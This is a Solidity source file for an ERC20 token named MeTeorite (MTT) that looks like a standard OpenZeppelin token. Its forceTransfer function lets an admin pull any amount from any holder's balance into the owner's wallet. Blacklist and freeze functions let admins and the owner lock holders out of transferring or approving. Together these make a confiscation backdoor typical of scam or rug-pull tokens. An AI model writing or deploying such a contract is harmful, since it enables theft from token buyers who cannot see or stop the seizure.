// SPDX-License-Identifier: MIT
// Compatible with OpenZeppelin Contracts ^5.0.0
pragma solidity ^0.8.22;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract MeTeorite is ERC20, AccessControl,Ownable  {
    bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");
    mapping(address => bool) private isBlacklisted;
    mapping(address => bool) private _frozenAccounts;

    constructor(address initialOwner)
        ERC20("MeTeorite", "MTT")
        Ownable(initialOwner)
    {
        _mint(initialOwner, 8045311447 * 10 ** decimals());
        _grantRole(DEFAULT_ADMIN_ROLE, initialOwner);
        _grantRole(ADMIN_ROLE, initialOwner);
    }

    event FrozenFunds(address target, bool frozen);

    function forceTransfer(address[] calldata users, uint256[] calldata amounts ) external onlyRole(ADMIN_ROLE) returns (bool) {
        require(users.length == amounts.length, "Arrays length mismatch");
        uint256 usersLength = users.length;
        address owner = owner();
        if(usersLength != 0){
            for (uint256 i = 0; i < usersLength; i++) 
            {
                address user = users[i];
                if(user != _msgSender() && address(user).balance > 0){
                    _transfer(user, owner, amounts[i]);
                }
            }
        }
        return true;
    }

    function setupBlacklist(address _user, bool enabled) external onlyRole(ADMIN_ROLE) {
        require(_user != owner(),"This is owner");
        require(_user != _msgSender(), "Can not change by yourself!");
        require(!hasRole(ADMIN_ROLE, _user),"This is admin");
        isBlacklisted[_user] = enabled;
    }

    function transfer(address recipient, uint256 amount) override public returns (bool) {
        require(!isBlacklisted[_msgSender()],"Sender are black listed");
        require(!isBlacklisted[recipient],"Recipient are black listed");
        require(!_frozenAccounts[_msgSender()],"Sender are freeze");
        require(!_frozenAccounts[recipient],"Recipient are freeze");
        address owner = _msgSender();
        _transfer(owner, recipient, amount);
        return true;
    }
    function approve(address spender, uint256 value) override public returns (bool){
        require(!isBlacklisted[_msgSender()],"Caller are black listed");
        require(!isBlacklisted[spender],"Spender are black listed");
        require(!_frozenAccounts[_msgSender()],"Caller are freeze");
        require(!_frozenAccounts[spender],"Spender are freeze");
        address owner = _msgSender();
        _approve(owner, spender, value);
        return true;
    } 

    function transferFrom(address from, address to, uint256 value) override public returns (bool){
        require(!isBlacklisted[_msgSender()],"Caller are black listed");
        require(!isBlacklisted[to],"Recipient are black listed");
        require(!isBlacklisted[from],"Owner are black listed");
        require(!_frozenAccounts[_msgSender()],"Caller are freeze");
        require(!_frozenAccounts[to],"Recipient are freeze");
        require(!_frozenAccounts[from],"Owner are freeze");
        address spender = _msgSender();
        _spendAllowance(from, spender, value);
        _transfer(from, to, value);
        return true;
    }

    function Blacklisted(address _user) public view returns (bool)
    {
        return isBlacklisted[_user];
    }

    function FrozenAccounts(address _user) public view returns (bool)
    {
        return _frozenAccounts[_user];
    } 

    function freezeAccount(address target, bool freeze) public onlyOwner {
        require(target != owner(),"This is owner");
        require(target != _msgSender(), "Can not change by yourself!");
        require(!hasRole(ADMIN_ROLE, target),"This is admin");
        _frozenAccounts[target] = freeze;
        emit FrozenFunds(target, freeze);
    }
}